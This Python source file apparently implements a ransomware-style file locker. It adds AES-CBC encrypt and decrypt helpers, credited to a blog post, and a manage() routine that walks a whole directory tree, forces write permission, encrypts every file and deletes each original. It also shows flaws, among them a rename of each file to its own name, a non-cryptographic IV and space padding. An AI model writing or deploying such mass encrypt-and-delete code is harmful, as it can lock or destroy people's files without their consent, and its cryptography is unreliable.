import os, random, struct
import shutil
import stat
from Crypto.Cipher import AES# @UnresolvedImport



 

def encrypt_file(key, in_filename, out_filename, chunksize):
    #source: http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))


def decrypt_file(key, in_filename, out_filename, chunksize):
    #source: http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)
            
            
def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
    #TODO, find a way to optimize this
    
    filesChanged = 0
    filesInUse = 0
    permissionDenied = 0
    unDeleteable = 0
    dontKnow = 0
    deleted = 0
    for subdir, dirs, files in os.walk(rootDirectionary):
        for file in files:
            
            
            filename = os.path.join(subdir, file)
            
            try:
                
                print(filename)
                newFile = file
                newFile += "a"    
                newFilename = os.path.join(subdir, file)
                try:
                    os.rename(filename, newFilename)
                except:
                    print("File is in use.")
                    filesInUse +=1
                    continue
                os.chmod(filename, stat.S_IWRITE)
                os.chmod(filename, stat.S_IWUSR)
            except IOError:
                print("dont know")
                dontKnow += 1
                continue    
            os.rename(newFilename, filename)
            
            
                
            if function == 0:    
                    try:
                        encrypt_file(key, filename, None, 64*1024)
                        filesChanged += 1
                        print(filesChanged)
                    except:
                        print("Permission denied")   
                        permissionDenied += 1 
                    try: 
                        
                        
                        if not ".enc" in filename:
                            os.remove(filename)
                            deleted += 1
                            
                    except OSError:
                            print("cant delete :(")
                            unDeleteable += 1
            elif function == 1:
                try:
                    decrypt_file(key, filename, None, 64*1024)
                except:
                    print("Permission denied")    
                    permissionDenied += 1 
                try: 
                    
                    if ".enc" in filename:
                        os.remove(filename)
                        deleted += 1
                except OSError:
                    print("cant delete :(")
                    unDeleteable += 1
    print(filesChanged)
    print(filesInUse)
    print(permissionDenied)
    print(unDeleteable)
    print(dontKnow)
    print(deleted)                
                           
